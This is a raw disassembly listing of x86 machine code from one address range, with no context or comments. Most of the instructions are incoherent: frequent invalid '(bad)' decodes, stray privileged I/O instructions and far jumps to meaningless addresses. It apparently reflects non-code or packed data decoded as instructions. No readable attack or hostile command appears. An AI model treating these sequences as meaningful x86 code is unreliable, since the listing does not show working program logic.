  41976e:	sbb    BYTE PTR [ecx+0x47],ah
  419771:	xor    esi,DWORD PTR [eax+0x11]
  419774:	hlt    
  419775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419776:	nop
  419777:	push   edx
  419778:	aas    
  419779:	je     0x419735
  41977b:	clc    
  41977c:	cwde   
  41977d:	mov    bh,0xff
  41977f:	scas   al,BYTE PTR es:[edi]
  419780:	lods   eax,DWORD PTR ds:[esi]
  419781:	cmp    al,0xed
  419783:	dec    ebp
  419784:	repz dec ebx
  419786:	xchg   edx,eax
  419787:	inc    ebx
  419788:	pop    edi
  419789:	pop    ecx
  41978a:	xchg   esi,eax
  41978b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41978c:	pop    ss
  41978d:	int3   
  41978e:	add    ah,ah
  419790:	inc    ebx
  419791:	aas    
  419792:	call   0x2897:0xa384cdc2
  419799:	out    dx,al
  41979a:	les    eax,FWORD PTR [ebx+ebx*4-0x60]
  41979e:	shl    dh,1
  4197a0:	inc    ebp
  4197a1:	mov    al,0x6f
  4197a3:	out    dx,al
  4197a4:	mov    esp,0x9fad9d2e
  4197a9:	push   esp
  4197aa:	(bad)
  4197ad:	xchg   ebp,eax
  4197ae:	ja     0x4197e9
  4197b0:	push   ebp
  4197b1:	mov    dh,0xab
  4197b3:	xor    ebx,ebx
  4197b5:	mov    ebx,0x87f65b1f
  4197ba:	xchg   ebx,eax
  4197bb:	mov    ch,0xc1
  4197bd:	jp     0x419760
  4197bf:	loopne 0x4197d3
  4197c1:	mov    ss,WORD PTR [edi+0x1b]
  4197c4:	test   bl,dh
  4197c6:	add    al,0x33
  4197c8:	aaa    
  4197c9:	lods   eax,DWORD PTR ds:[esi]
  4197ca:	int3   
  4197cb:	jno    0x419779
  4197cd:	mov    bl,0x8b
  4197cf:	jb     0x41981b
  4197d1:	mov    ebx,0xbeb8ed16
  4197d6:	popf   
  4197d7:	and    edx,DWORD PTR [eax]
  4197d9:	xchg   esp,eax
  4197da:	mov    fs:0x417d4f5d,eax
  4197e0:	add    al,0x78
  4197e2:	(bad)  
  4197e3:	sti    
  4197e4:	mov    ebp,0xad39f618
  4197e9:	ret    
  4197ea:	mov    cl,BYTE PTR [ecx]
  4197ec:	aas    
  4197ed:	stc    
  4197ee:	bound  ebp,QWORD PTR [ebx+0x6b7cb449]
  4197f4:	(bad)  
  4197f6:	jp     0x419827
  4197f8:	jbe    0x4197fb
  4197fa:	std    
  4197fb:	ror    BYTE PTR [ebx+0x0],cl
  419801:	add    BYTE PTR [ecx+ebp*8],dl
  419804:	je     0x41982a
  419806:	std    
  419807:	mov    ebp,0x2ac7f954
  41980c:	(bad)  
  41980d:	rol    BYTE PTR ds:0xd07c0cb7,1
  419813:	adc    al,0x1
  419815:	add    bl,dh
  419817:	add    al,0x0
  419819:	add    ch,bl
  41981b:	loope  0x4197c5
  41981d:	stos   DWORD PTR es:[edi],eax
  41981e:	sti    
  41981f:	test   DWORD PTR [edi],esp
  419821:	push   edi
  419822:	clc    
  419823:	add    DWORD PTR [ecx-0x23],edx
  419826:	fisttp DWORD PTR [edi+ebx*2+0x58]
  41982a:	test   BYTE PTR [edx],bl
  41982c:	dec    ebx
  41982d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41982f:	sbb    al,0x63
  419831:	push   edi
  419832:	enter  0xf9b0,0x3b
  419836:	addr16 mov ch,0x58
  419839:	mov    ds,WORD PTR [ebx+esi*1+0xaa47879]
  419840:	jmp    0x419843
  419842:	aaa    
  419843:	pop    esp
  419844:	inc    esi
  419845:	lahf   
  419846:	xor    dl,al
  419848:	mov    esp,0x62da216b
  41984d:	fidivr WORD PTR [edi-0x7f]
  419850:	cdq    
  419851:	aam    0xb
  419853:	mov    WORD PTR ds:0xf54536fa,fs
  419859:	mov    ecx,0xcf015ffe
  41985e:	sub    al,0x20
  419860:	adc    ch,bl
  419862:	loopne 0x419832
  419864:	cmp    BYTE PTR [edi+0x4179026f],0xec
  41986b:	push   esp
  41986c:	addr16 cwde 
  41986e:	out    dx,al
  41986f:	out    dx,eax
  419870:	jo     0x4198e3
  419872:	fistp  DWORD PTR [esi+0x604ce79]
  419878:	pop    ds
  419879:	adc    al,0x5
  41987b:	cmp    al,0xc6
  41987d:	and    eax,0x8a86b95
  419882:	daa    
  419883:	mov    esi,0x704bdb34
  419888:	mov    edx,ebx
  41988a:	outs   dx,DWORD PTR ds:[esi]
  41988b:	or     ebp,ecx
  41988d:	xor    cl,BYTE PTR [ebx+0x5734ede]
  419893:	pusha  
  419894:	push   ebx
  419895:	jnp    0x4198da
  419897:	sbb    eax,0x46d75887
  41989c:	push   0x967be4ca
  4198a1:	push   ss
  4198a2:	inc    esp
  4198a3:	xchg   DWORD PTR [edx],ecx
  4198a5:	js     0x4198b1
  4198a7:	(bad)  
  4198a8:	mov    WORD PTR [edx-0x1a164f1d],gs
  4198ae:	shl    DWORD PTR [edi+0x8],1
  4198b1:	jecxz  0x419872
  4198b3:	sub    esi,esi
  4198b5:	sbb    ch,BYTE PTR [eax]
  4198b7:	ins    BYTE PTR es:[edi],dx
  4198b8:	js     0x4198b7
  4198ba:	sbb    eax,0x6099db2d
  4198bf:	dec    ebx
  4198c0:	cdq    
  4198c1:	cmp    al,0x8f
  4198c3:	xchg   edx,ecx
  4198c5:	pop    esp
  4198c6:	sub    al,0xe
  4198c8:	or     eax,0xeb0b65c5
  4198cd:	pusha  
  4198ce:	lods   al,BYTE PTR ds:[esi]
  4198cf:	dec    edx
  4198d0:	in     eax,dx
  4198d1:	sub    cl,BYTE PTR [ebx-0x25418a3a]
  4198d7:	sub    al,0xd6
  4198d9:	adc    cl,bh
  4198db:	mov    ah,0xdf
  4198dd:	je     0x419903
  4198df:	loop   0x41988a
  4198e1:	xor    eax,0xb0cf4bc9
  4198e6:	mov    cl,0xa9
  4198e8:	dec    esi
  4198e9:	xchg   DWORD PTR [eax-0x1f],esi
  4198ec:	jl     0x41993c
  4198ee:	shl    DWORD PTR [edi],1
  4198f0:	push   edx
  4198f1:	dec    DWORD PTR [eax-0xc]
  4198f4:	pop    es
  4198f5:	and    al,BYTE PTR [ecx-0x5b]
  4198f8:	lods   eax,DWORD PTR ds:[esi]
  4198f9:	gs mov bh,0x40
  4198fc:	pxor   xmm0,xmm7
  419900:	sbb    al,0xdd
  419902:	inc    ecx
  419903:	dec    eax
  419904:	push   eax
  419905:	mov    cl,0x61
  419907:	mov    cl,0x30
  419909:	inc    esi
  41990a:	jmp    0x5b36cd34
  41990f:	jl     0x4198cb
  419911:	ins    DWORD PTR es:[edi],dx
  419912:	push   0xffffffad
  419914:	pop    ds
  419915:	or     BYTE PTR [ecx-0x77],0x25
  419919:	aas    
  41991a:	(bad)  
  41991b:	mov    ds:0x54fbe214,al
  419920:	iret   
  419921:	lods   eax,DWORD PTR ds:[esi]
  419922:	dec    edi
  419923:	out    0x74,eax
  419925:	retf   
  419926:	shl    esp,1
  419928:	mov    esp,0x7f3dfd19
  41992d:	cmp    eax,0xae5007c4
  419932:	std    
  419933:	adc    bh,BYTE PTR [edx-0x62c16984]
  419939:	mov    es,WORD PTR [ebp-0x72]
  41993c:	cmc    
  41993d:	loope  0x4198c7
  41993f:	ins    BYTE PTR es:[edi],dx
  419940:	std    
  419941:	(bad)  
  419942:	cmp    bl,BYTE PTR [eax-0x76]
  419945:	xor    DWORD PTR [edi+0x171d8444],0xfffffff2
  41994c:	repnz sbb BYTE PTR [edx+0x3],0xd8
  419951:	ret    
  419952:	xchg   ecx,eax
  419953:	mov    cl,0x3d
  419955:	push   0x4d52c371
  41995a:	(bad)  
  41995b:	jns    0x419937
  41995d:	in     al,0xeb
  41995f:	ret    
  419960:	outs   dx,DWORD PTR ds:[esi]
  419961:	mov    ds:0xe1e10963,eax
  419966:	pusha  
  419967:	inc    esp
  419968:	or     al,0xf1
  41996a:	lahf   
  41996b:	inc    esp
  41996c:	xchg   ebp,eax
  41996d:	test   BYTE PTR [ebp+0x64982f3a],ah
  419973:	iret   
  419974:	cmp    BYTE PTR [ebp-0x71383fe5],0x81
  41997b:	cmp    al,0xeb
  41997d:	clc    
  41997e:	in     al,0xd7
  419980:	inc    esi
  419981:	in     al,dx
  419982:	add    BYTE PTR [edi-0x1c],0x76
  419986:	sub    DWORD PTR [esi-0x41],esp
  419989:	jmp    0x419980
  41998b:	sub    bl,BYTE PTR ds:0x11d5d4c
  419991:	rcl    BYTE PTR [edx],1
  419993:	out    0x10,eax
  419995:	loope  0x4199ce
  419997:	fiadd  WORD PTR [edi-0x498051cf]
  41999d:	add    esi,DWORD PTR [ecx]
  41999f:	or     ah,ah
  4199a1:	(bad)  
  4199a2:	xchg   edi,eax
  4199a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a4:	jmp    0x4199a8
  4199a6:	mov    cl,0x53
  4199a8:	repnz dec ecx
  4199aa:	lock and dh,ch
  4199ad:	in     al,0xab
  4199af:	cs scas al,BYTE PTR es:[edi]
  4199b1:	add    BYTE PTR [edi-0x10],0x1f
  4199b5:	fs add eax,0xfe3923c2
  4199bb:	pushf  
  4199bc:	and    ebp,DWORD PTR [ebp+eiz*2-0x6935813]
  4199c3:	call   0xed46:0x820856bf
  4199ca:	iret   
  4199cb:	xor    al,BYTE PTR [ecx-0x3c]
  4199ce:	int    0x3b
  4199d0:	inc    eax
  4199d1:	mov    dh,0xb0
  4199d4:	in     eax,dx
  4199d5:	pop    ds
  4199d6:	inc    esp
  4199d7:	(bad)  
  4199d8:	into   
  4199d9:	jle    0x4199a6
  4199db:	int    0xbf
  4199dd:	mov    BYTE PTR [ebx],dh
  4199df:	cmp    BYTE PTR [eax+0x6ccbb1bc],0x8c
  4199e6:	and    dh,BYTE PTR [ecx]
  4199e8:	jmp    0xaf747abc
  4199ed:	jne    0x4199ec
  4199ef:	lods   ax,WORD PTR ds:[esi]
  4199f1:	adc    DWORD PTR [edx-0x27a146e0],0xffffffea
  4199f8:	les    ebx,FWORD PTR [edx+0x1d236743]
  4199fe:	(bad)  [eax+0x16]
  419a01:	cwde   
  419a02:	ss inc ecx
  419a04:	adc    edi,DWORD PTR [ebp-0x12]
  419a07:	inc    esi
  419a08:	enter  0xc826,0x24
  419a0c:	int3   
  419a0d:	rcl    edx,0xf4
  419a10:	sub    ah,BYTE PTR [ecx]
  419a12:	cld    
  419a13:	cli    
  419a14:	dec    eax
  419a15:	mov    al,0x4f
  419a17:	mov    ah,BYTE PTR [ebp+0x93c199d]
  419a1d:	xchg   ebp,eax
  419a1e:	loop   0x419a98
  419a20:	lods   eax,DWORD PTR ds:[esi]
  419a21:	mov    eax,0x30e75ae0
  419a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a27:	jne    0x4199c0
  419a29:	push   edx
  419a2a:	cmp    bl,BYTE PTR [ebx-0x6f3217c6]
  419a30:	(bad)  
  419a31:	call   0x7699:0xfadac36
  419a38:	lea    edx,[esi+0x45ffa418]
  419a3e:	cmp    ch,BYTE PTR [eax]
  419a40:	inc    edi
  419a41:	dec    ecx
  419a42:	ficomp DWORD PTR [ebp+edi*2+0x7b]
  419a46:	mov    edi,DWORD PTR [ecx]
  419a48:	bound  ebx,QWORD PTR [ebx-0x1f11c2bc]
  419a4e:	jbe    0x419a45
  419a50:	mov    eax,ds:0x82736412
  419a55:	xchg   DWORD PTR [edi],edi
  419a57:	mov    esi,0x3fa16c9a
  419a5c:	jno    0x419a96
  419a5e:	imul   edx,eax,0x9438e8aa
  419a64:	xlat   BYTE PTR ds:[ebx]
  419a65:	ja     0x419a59
  419a67:	lahf   
  419a68:	fisub  WORD PTR [edi+0x6266a87b]
  419a6e:	mov    eax,0x90000470
  419a73:	jl     0x419a0c
  419a75:	das    
  419a76:	sub    al,0xc4
  419a78:	fnstcw WORD PTR [ebp-0x1c774054]
  419a7e:	icebp  
  419a7f:	cld    
  419a80:	fsubrp st(2),st
  419a82:	push   cs
  419a83:	rcr    BYTE PTR [edi+esi*4+0x3adbd222],1
  419a8a:	stc    
  419a8b:	xor    eax,0xadc965a4
  419a90:	pop    esp
  419a91:	adc    dh,dl
  419a93:	mov    ebx,0xac20b292
  419a98:	jnp    0x419ae5
  419a9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a9b:	add    dl,0xce
  419a9e:	push   0xffffffdd
  419aa0:	hlt    
  419aa1:	lea    edx,[ebx+0x55]
  419aa4:	and    ch,al
  419aa6:	adc    ebp,esi
  419aa8:	and    bh,BYTE PTR [edi+0x78]
  419aab:	sar    DWORD PTR [edi+0x4079c10f],1
  419ab1:	mov    ebp,0x115aa8e5
  419ab6:	jae    0x419ae1
  419ab8:	shl    BYTE PTR [eax+0x3dd83e95],cl
  419abe:	add    DWORD PTR [ebp+esi*1-0x570c7658],0x62f45494
  419ac9:	pop    es
  419aca:	mov    al,0x35
  419acc:	cmp    eax,0xccf750eb
  419ad1:	js     0x419b26
  419ad3:	pop    edx
  419ad4:	inc    esp
  419ad5:	test   ecx,ecx
  419ad7:	add    BYTE PTR [ebp-0x2633587c],0x52
  419ade:	inc    esi
  419adf:	leave  
  419ae0:	(bad)  
  419ae1:	out    dx,al
  419ae2:	cmc    
  419ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ae4:	icebp  
  419ae5:	repz test BYTE PTR [esi],cl
  419ae8:	inc    ecx
  419ae9:	jmp    0xda90c961
  419aee:	stc    
  419aef:	sub    al,0x38
  419af1:	fistp  QWORD PTR [ebp-0x5adfd3a7]
  419af7:	enter  0x6caf,0x66
  419afb:	fs hlt 
  419afd:	fiadd  DWORD PTR [edi-0x8b51396]
  419b03:	inc    edi
  419b04:	repz (bad) 
  419b06:	lods   al,BYTE PTR ds:[esi]
  419b07:	xchg   ah,ah
  419b09:	mov    eax,ds:0x9e76bd7a
  419b0e:	pushf  
  419b0f:	repz mov cl,0xb9
  419b12:	(bad)  [ebx+0x10]
  419b15:	add    ebx,DWORD PTR [ecx+0x1]
  419b18:	push   ebp
  419b19:	add    eax,0xa2172e5f
  419b1e:	ss out 0xcf,eax
  419b21:	push   edi
  419b22:	push   esi
  419b23:	mov    edx,0xa2df22ae
  419b28:	call   0xc035cd78
  419b2d:	add    eax,0xb3e6ee0
  419b32:	and    al,0x19
  419b34:	jmp    0xb0e0:0xeb00983b
  419b3b:	jb     0x419b03
  419b3d:	dec    esp
  419b3e:	loopne 0x419b09
  419b40:	adc    al,0xeb
  419b42:	xchg   BYTE PTR [edi],cl
  419b44:	test   al,0x41
  419b46:	popa   
  419b47:	out    0x5b,al
  419b49:	and    DWORD PTR [edx+esi*2],ebx
  419b4c:	sti    
  419b4d:	mov    esi,0x7cd99d9e
  419b52:	retf   
  419b53:	sbb    edx,DWORD PTR [edx+0x11faa20d]
  419b59:	add    al,0x85
  419b5b:	or     cl,BYTE PTR [ebx+0x4d]
  419b5e:	icebp  
  419b5f:	icebp  
  419b60:	pop    ecx
  419b61:	(bad)  [esp+ecx*4]
  419b64:	inc    ecx
  419b65:	cmp    edx,DWORD PTR [esi-0x1132e9c8]
  419b6b:	pop    es
  419b6c:	inc    ecx
  419b6d:	cmp    cl,BYTE PTR [ebp+0x7105dee5]
  419b73:	dec    edx
  419b74:	inc    ebp
  419b75:	lods   eax,DWORD PTR ds:[esi]
  419b76:	(bad)  
  419b77:	jp     0x419bae
  419b79:	adc    eax,0x5a687393
  419b7e:	xor    al,0x45
  419b80:	imul   edi,ebx,0xffffffe0
  419b83:	mov    dl,BYTE PTR [eax]
  419b85:	inc    ecx
  419b86:	and    eax,DWORD PTR [eax+0x19cbead2]
  419b8c:	pushf  
  419b8d:	loope  0x419b44
  419b8f:	pop    ebx
  419b90:	push   esi
  419b91:	ins    BYTE PTR es:[edi],dx
  419b92:	sub    eax,0x34a8f647
  419b97:	jl     0x419c0f
  419b99:	mov    ds,WORD PTR es:[esi]
  419b9c:	stc    
  419b9d:	push   ss
  419b9e:	fld    TBYTE PTR [ebx+ecx*2]
  419ba1:	les    edi,FWORD PTR [esi]
  419ba3:	and    bl,BYTE PTR fs:[ecx]
  419ba6:	loopne 0x419bbc
  419ba8:	loopne 0x419bd6
  419baa:	mov    bh,0xb6
  419bac:	push   esp
  419bad:	inc    eax
  419bae:	adc    dl,ch
  419bb0:	int    0x24
  419bb2:	das    
  419bb3:	mov    dh,0xb5
  419bb5:	pop    es
  419bb6:	sub    al,0x3f
  419bb8:	pushf  
  419bb9:	mov    edi,cr5
  419bbc:	xlat   BYTE PTR ds:[ebx]
  419bbd:	mov    ebp,esp
  419bbf:	aam    0x31
  419bc1:	pop    ebp
  419bc2:	in     al,dx
  419bc3:	inc    esp
  419bc4:	push   0x9
  419bc6:	adc    esi,DWORD PTR [eax]
  419bc8:	les    ecx,FWORD PTR [eax+ebp*4-0x72]
  419bcc:	push   edx
  419bcd:	sbb    edx,ebp
  419bcf:	sahf   
  419bd0:	cmp    ah,ah
  419bd2:	ins    DWORD PTR es:[edi],dx
  419bd3:	mov    bh,0x2d
  419bd5:	jecxz  0x419b58
  419bd7:	lods   al,BYTE PTR ds:[esi]
  419bd8:	inc    ebx
  419bd9:	xchg   edx,eax
  419bda:	mov    cl,0xcd
  419bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bdd:	jp     0x419bb5
  419bdf:	jl     0x419b7b
  419be1:	xchg   esp,eax
  419be2:	or     DWORD PTR [esi-0x2d],0x897722dd
  419be9:	or     al,BYTE PTR [edi-0x3a]
  419bec:	jp     0x419b70
  419bee:	jmp    0x9810:0xb43afe77
  419bf5:	arpl   ax,cx
  419bf7:	call   0xb720:0x7bc0b271
  419bfe:	sbb    eax,0xb401e568
  419c03:	ror    DWORD PTR [ebx+eiz*8+0x4bad6541],0x40
  419c0b:	lods   al,BYTE PTR ds:[esi]
  419c0c:	and    BYTE PTR [ecx],0x6d
  419c0f:	mov    eax,0x2a85808e
  419c14:	jne    0x419c35
  419c16:	div    esp
  419c18:	fsub   st(7),st
  419c1a:	daa    
  419c1b:	pop    ds
  419c1c:	scas   al,BYTE PTR es:[edi]
  419c1d:	stos   DWORD PTR es:[edi],eax
  419c1e:	or     BYTE PTR [ecx+ebx*8-0x31],dh
  419c22:	test   ah,cl
  419c24:	cmp    edx,DWORD PTR [ecx+0x7a925acd]
  419c2a:	jge    0x419c7d
  419c2c:	fdiv   DWORD PTR [esi-0x6e]
  419c2f:	imul   ebp,DWORD PTR [ebp+eiz*4-0x9a52a01],0x7066c2b6
  419c3a:	lahf   
  419c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c3c:	dec    edi
  419c3d:	push   esp
  419c3e:	(bad)  
  419c3f:	sahf   
  419c40:	lods   al,BYTE PTR ds:[esi]
  419c41:	imul   ecx,ebp,0xffffffec
  419c44:	cs loop 0x419c91
  419c47:	jmp    0x8085c3f
  419c4c:	loop   0x419ca9
  419c4e:	gs pushf 
  419c50:	mov    WORD PTR [ecx+eiz*1-0x511d2185],ds
  419c57:	push   eax
  419c58:	or     BYTE PTR [esi+0x604c71bc],ah
  419c5e:	aas    
  419c5f:	scas   al,BYTE PTR es:[edi]
  419c60:	jo     0x419c02
  419c62:	xor    BYTE PTR [edi],cl
  419c64:	retf   0x1e00
  419c67:	imul   ebx,DWORD PTR [eax],0x8e609bbc
  419c6d:	pop    eax
  419c6e:	or     eax,0xcb8202ae
  419c73:	lods   eax,DWORD PTR ds:[esi]
  419c74:	test   bh,ah
  419c76:	sub    DWORD PTR [esp+ebp*4+0x313dea58],ecx
  419c7d:	lds    ecx,FWORD PTR [ebx-0x7f]
  419c80:	ret    0x58bf
  419c83:	pop    edi
  419c84:	fld    TBYTE PTR [edi+0x57]
  419c87:	adc    eax,0x345b83d7
  419c8c:	push   0xffffff95
  419c8e:	out    dx,eax
  419c8f:	mov    ebp,0x1b02de36
  419c94:	jge    0x419c96
  419c96:	scas   al,BYTE PTR es:[edi]
  419c97:	dec    eax
  419c98:	jno    0x419d18
  419c9a:	(bad)  
  419c9b:	jmp    0x48ffedd0
  419ca0:	(bad)  
  419ca1:	fdiv   DWORD PTR [esi*4+0x1c32522b]
  419ca8:	out    dx,al
  419ca9:	or     esi,DWORD PTR [edi+eax*8-0x91376d6]
  419cb0:	mov    ebp,es
  419cb2:	fsubp  st(6),st
  419cb4:	pop    esp
  419cb5:	(bad)  
  419cb6:	and    eax,0xfeaf1bc7
  419cbb:	fisubr DWORD PTR [edx+0x241fc3ae]
  419cc1:	add    DWORD PTR [ebx],edi
  419cc3:	jnp    0x419ced
  419cc5:	inc    ebx
  419cc6:	call   0x666b:0x8331c009
  419ccd:	js     0x419cd0
  419ccf:	adc    al,0x90
  419cd1:	in     al,dx
  419cd2:	into   
  419cd3:	inc    eax
  419cd4:	out    0xac,al
  419cd6:	mov    ah,0x7
  419cd8:	adc    eax,0x590ec7f2
  419cdd:	scas   eax,DWORD PTR es:[edi]
  419cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cdf:	test   ch,dl
  419ce1:	stos   BYTE PTR es:[edi],al
  419ce2:	mov    DWORD PTR [eax-0x24be42bd],ebp
  419ce8:	fld    QWORD PTR [ebx-0x16]
  419ceb:	pop    ebp
  419cec:	and    DWORD PTR [ecx-0x7c96b942],ebx
  419cf2:	mov    ds:0x8ff0f465,al
  419cf7:	sub    eax,0x8553559
  419cfc:	adc    DWORD PTR [edx+0x12047736],0x1
  419d03:	cmp    DWORD PTR [eax],eax
  419d05:	test   eax,0x2a959562
  419d0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d0b:	jnp    0x419ca8
  419d0d:	add    BYTE PTR [eax],al
  419d0f:	add    BYTE PTR [eax],al
  419d11:	add    BYTE PTR [eax-0x329b3fbb],cl
  419d17:	in     eax,0xac
  419d19:	in     eax,dx
  419d1a:	or     dh,BYTE PTR [ebp+0x38fc077c]
  419d20:	fwait
  419d21:	stc    
  419d22:	ret    
  419d23:	sbb    DWORD PTR [ecx],eax
  419d25:	add    bl,dh
  419d27:	add    al,0x0
  419d29:	add    BYTE PTR [edi+ecx*8],ch
  419d2c:	in     al,dx
  419d2d:	mov    cl,0x46
  419d2f:	jnp    0x419d3c
  419d31:	fs cmp al,0xe3
  419d34:	mov    eax,ds:0x10b12b78
  419d39:	jp     0x419d3b
  419d3b:	xlat   BYTE PTR ds:[ebx]
  419d3c:	lds    eax,FWORD PTR [ecx+0x35]
  419d3f:	rcl    DWORD PTR [edi],1
  419d41:	mov    al,ds:0x63ee15f6
  419d46:	fisttp WORD PTR ds:0xfa7d4492
  419d4c:	call   0x4bef3bdf
  419d51:	mov    esi,DWORD PTR [edx-0x3ec8625c]
  419d57:	mov    dh,BYTE PTR [eax+0x7a]
  419d5a:	mov    WORD PTR [ebp+ebx*8+0x6fa3d76],?
  419d61:	mov    edx,0x328b16e2
  419d66:	dec    esp
  419d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d68:	mov    ebp,0x129014d1
  419d6d:	stc    
  419d6e:	push   edx
  419d6f:	outs   dx,BYTE PTR ds:[esi]
  419d70:	mov    ebp,0x75ce3dbd
  419d75:	push   ebp
  419d76:	mov    esp,0x8f607386
  419d7b:	jmp    0xf0f8:0xf7417fa9
  419d82:	jl     0x419dec
  419d84:	pop    ds
  419d85:	xchg   ebx,eax
  419d86:	popf   
  419d87:	out    0x98,al
  419d89:	inc    edi
  419d8a:	add    DWORD PTR [ebx+ebx*2],ebp
  419d8d:	loopne 0x419dda
  419d8f:	in     al,0x1c
  419d91:	mov    bh,0x4c
  419d93:	xor    esp,DWORD PTR [edi]
  419d95:	xlat   BYTE PTR ds:[ebx]
  419d96:	rcr    BYTE PTR [esi-0x58],cl
  419d99:	sub    cl,BYTE PTR [esp+edi*8]
  419d9c:	lahf   
  419d9d:	cld    
  419d9e:	shl    ebp,0x2a
  419da1:	ja     0x419e1e
  419da3:	or     esi,DWORD PTR [esi+0x37bc1e20]
  419da9:	retf   
  419daa:	out    dx,eax
  419dab:	mov    ds:0x4d565b33,eax
  419db0:	or     bl,ch
  419db2:	cld    
  419db3:	(bad)  
  419db4:	jmp    0x9435:0xbca45a81
  419dbb:	mov    bl,0xef
  419dbd:	fyl2x  
  419dbf:	jae    0x419df4
  419dc1:	js     0x419dba
  419dc3:	pop    eax
  419dc4:	inc    ebx
  419dc5:	fwait
  419dc6:	xor    BYTE PTR [esi+0x3e7eab80],bh
  419dcc:	add    eax,0x76d01aed
  419dd1:	xor    ah,BYTE PTR ds:0xb6958d79
  419dd7:	imul   edx,DWORD PTR [esi-0x9434695],0xffffffee
  419dde:	adc    esi,DWORD PTR [edi-0x468f6dc5]
  419de4:	mov    dh,0x38
  419de6:	adc    DWORD PTR [edx-0xef0b2c8],edx
  419dec:	sub    DWORD PTR [edi+0x2b8b67a],0xb91920f4
  419df6:	xchg   esp,eax
  419df7:	or     eax,0x62ac9b35
  419dfc:	aaa    
  419dfd:	dec    ebx
  419dfe:	enter  0xb7bb,0xdf
  419e02:	in     al,dx
  419e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e04:	loope  0x419de0
  419e06:	and    ebp,DWORD PTR [ebx+0x59]
  419e09:	fs mov ah,0xb5
  419e0c:	cli    
  419e0d:	and    al,0x4c
  419e0f:	pop    ebp
  419e10:	pop    ds
  419e11:	jbe    0x419e3e
  419e13:	lds    edx,FWORD PTR [esi+0x2]
  419e16:	imul   ebp,DWORD PTR [edx-0x59],0x71
  419e1a:	add    ebx,DWORD PTR ds:0xe4f05b9
  419e20:	adc    edx,DWORD PTR ds:0x3d43cd71
  419e26:	es js  0x419e6a
  419e29:	sahf   
  419e2a:	test   al,0xeb
  419e2c:	iret   
  419e2d:	mov    ds:0x34372789,eax
  419e32:	mov    ebx,0x9f0019c2
  419e37:	fist   WORD PTR [edi+0x5d1138da]
  419e3d:	xor    al,0x52
  419e3f:	cmp    DWORD PTR [edx],esi
  419e41:	and    bl,BYTE PTR [edi+0x11]
  419e44:	imul   ebx,DWORD PTR [edx+0x2cafacd7],0x18
  419e4b:	shr    al,0x4e
  419e4e:	push   esp
  419e4f:	dec    ebp
  419e50:	rcr    DWORD PTR [ebp-0x7c],0x8d
  419e54:	fbld   TBYTE PTR [ebx+0x53]
  419e57:	jle    0x419ebf
  419e59:	hlt    
  419e5a:	dec    edx
  419e5b:	pop    ebx
  419e5c:	xor    edx,ebx
  419e5e:	dec    ecx
  419e5f:	mov    esp,0xfe4f24e9
  419e64:	sub    bl,0xe2
  419e67:	lahf   
  419e68:	es mov ah,0x97
  419e6b:	push   cs
  419e6c:	mov    ch,0x5f
  419e6e:	inc    ecx
  419e6f:	shl    DWORD PTR [ebx+edx*2+0x64],cl
  419e73:	popa   
  419e74:	repz cdq 
  419e76:	pop    esp
  419e77:	mov    al,ds:0xc556ccdb
  419e7c:	jmp    0x4972:0x742255db
  419e83:	sbb    al,0x1b
  419e85:	not    DWORD PTR [ecx+ebx*8+0x2f5c2c1a]
  419e8c:	enter  0xb65c,0x37
  419e90:	push   esp
  419e91:	je     0x419efd
  419e93:	add    ecx,DWORD PTR [esi-0x15dbc5bf]
  419e99:	aas    
  419e9a:	push   esi
  419e9b:	ins    DWORD PTR es:[edi],dx
  419e9c:	loope  0x419eb7
  419e9e:	gs and al,0xe
  419ea1:	mov    ebx,0x4d78f1a3
  419ea6:	in     eax,dx
  419ea7:	cs jmp 0x104c:0xdbefbae9
  419eaf:	and    ebx,DWORD PTR [edi+edx*2-0x7aa8891f]
  419eb6:	hlt    
  419eb7:	pusha  
  419eb8:	ss mov ebp,0x78c5ebe1
  419ebe:	mov    al,ds:0xe5b8ffda
  419ec3:	cmp    BYTE PTR [ebx],dh
  419ec5:	mov    edx,0x5f69c63
  419eca:	fnstcw WORD PTR [ecx+ebp*8]
  419ecd:	pushf  
  419ece:	rol    DWORD PTR [edi+0x16],cl
  419ed1:	ja     0x419ea3
  419ed3:	and    ebx,DWORD PTR [ebp+0x62]
  419ed6:	push   0x20
  419ed8:	or     eax,0xba265d64
  419edd:	pop    esi
  419ede:	or     BYTE PTR [ecx-0x40],ch
  419ee1:	xchg   edi,eax
  419ee2:	mov    cl,0x5b
  419ee4:	not    DWORD PTR [edi+ebx*4-0x204c846e]
  419eeb:	push   0x1f
  419eed:	or     cl,BYTE PTR [edi+0x55ec47aa]
  419ef3:	jno    0x419f42
  419ef5:	ret    0x299a
  419ef8:	neg    BYTE PTR [eax]
  419efa:	add    DWORD PTR [ebx],ebx
  419efc:	sbb    ah,BYTE PTR [ebx+0x7de36299]
  419f02:	call   esi
  419f04:	jae    0x419e9c
  419f06:	pushf  
  419f07:	adc    DWORD PTR [esi+0x861c45a],0x4219e52
  419f11:	xor    eax,0xa2aefd11
  419f16:	inc    edx
  419f17:	(bad)  
  419f18:	fs in  al,0x1a
  419f1b:	xor    esp,DWORD PTR [ecx-0xf]
  419f1e:	lds    esp,FWORD PTR [eax]
  419f20:	xchg   BYTE PTR [esi+0x5a],cl
  419f23:	sub    al,0xfb
  419f25:	sub    eax,0x5d25da16
  419f2a:	and    DWORD PTR [edi],ebx
  419f2c:	sub    al,0xfd
  419f2e:	xchg   esi,eax
  419f2f:	push   esp
  419f30:	das    
  419f31:	fs jl  0x419fb3
  419f34:	ds retf 0x473c
  419f38:	seta   al
  419f3b:	test   eax,0x2e64e81a
  419f40:	mov    eax,0xbd47a429
  419f45:	inc    esp
  419f46:	ficom  DWORD PTR [edx]
  419f48:	fst    DWORD PTR [ebx+0x7c87b34a]
  419f4e:	push   eax
  419f4f:	shr    DWORD PTR [eax*8+0x1890923b],cl
